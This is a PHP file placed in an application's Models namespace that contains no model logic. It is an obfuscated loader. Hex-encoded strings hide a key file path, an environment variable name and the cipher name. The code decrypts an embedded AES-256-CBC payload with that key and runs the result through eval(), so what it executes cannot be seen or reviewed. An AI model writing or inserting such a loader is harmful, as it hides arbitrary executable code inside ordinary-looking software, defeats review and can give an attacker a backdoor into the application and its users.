<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('VxqeauP7fPLApnf+JK9opw==');

$c=base64_decode(

'GscM1F/qch9cRW+Ugb7oabZe6jRD0kIYvtwnikL2V6ZVEAg3q9o3UopE9n2Kbq9NRyd0irIzbEDj' .
'b9sZwIDYTK5BNjHBF0/cE6p0KiyubqMSK8CrShknmvJ+fhl9QTaM6olchdM4OiBw8AU7jOKq1eDr' .
'GYr/fAso2OwSAr+u/FRutu/1iQehwS/T85rYOzbMdrxZvFx23/8hHIhFQ2GOaRo34/aLnR0hqRBx' .
'739yy0GsyBEvUNhIaJ6q6QKv48IuMgMb/TGJDEMXHQvG0vbyYG5iw9RIa/SYc0vp2B70390IymAc' .
'liA/QOIz9BG7tHGm1GBiS75+qjYe02MvgXfB9TCZA3yAwH2BRI21StzN+ikiWixr2EUa4WzGdJ3v' .
'xRrn32cDzHFW+vn6QqfCMP8VpUag2I+iJA3rP99OGUXIoSErmfLJYbuGa2nrRqtSo76IgAsaPZ1L' .
'D23dMYJ3RBbAR3Ph7K36h5YvFsevpzlAmlLrYrVLkrlKabOyF9VdmWFpANx1a1TpV3+aHLxCnMCY' .
'4W70SXHY2+snR5ABL/Wnakb95lFJaFW8h1kmXVXXCzkAcJmw8kEocCCmCw26+shGnJPP5CZgGTof' .
'6gP2TcsH/GoLRyE7YGs677XNUrPHKH4UrBb5dlwVKBzH1pQv/ul+ZjRrRW51sOYyAGxGb9Cfrq7d' .
'+CV+juFCUNqBQQMkunmi5gfnts3zEcJaZjktK23TjoXY6Ree4S9wsfYDSsaGxMOz9pzI2U3ze/dp' .
'8yrIYXMox/2Bc948fw4Oqrd7YZidXxnL9bTQsEyUR2gVyGtADfpEKFd9bvq3fxwM4NMjMKRaNV+Y' .
'yr7Jd7Ryp0pjHcmzPYqN0134XrsKTX1oKo3RvPlHnyH0tOmxRwg0hO0IF6d18yg76KrAptvEJrGi' .
'8qelSr/wE+hdvnsLXXVpcWWY2QUB//KjCeC45fSH5i7SMA8oe32WnX5/Qq3Xy9F8eIE3RaQOCFeh' .
'NnPcNc83tq4yKeeR/UIRvQgID5GudiNaJQQ+T4h6fA4A+YFKJ7rjnJ1NZreg25yTW3UaJU75i88M' .
'/bKzkJM8VDO+3TMloPZPG9bfW95/yfLeb7R6+/M175KBE8nrJdxEG7cauJRTqdRn+NdVJuik22eA' .
'SFfhDcT8E6vaNdGfueL66FiI+p/8Ykx/C5S0bPCGlk+eBPBeG/YtAlwoMJeJewTh595qyqOiWNk3' .
'7JS/e2dG+VRqdWihhvmOqQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

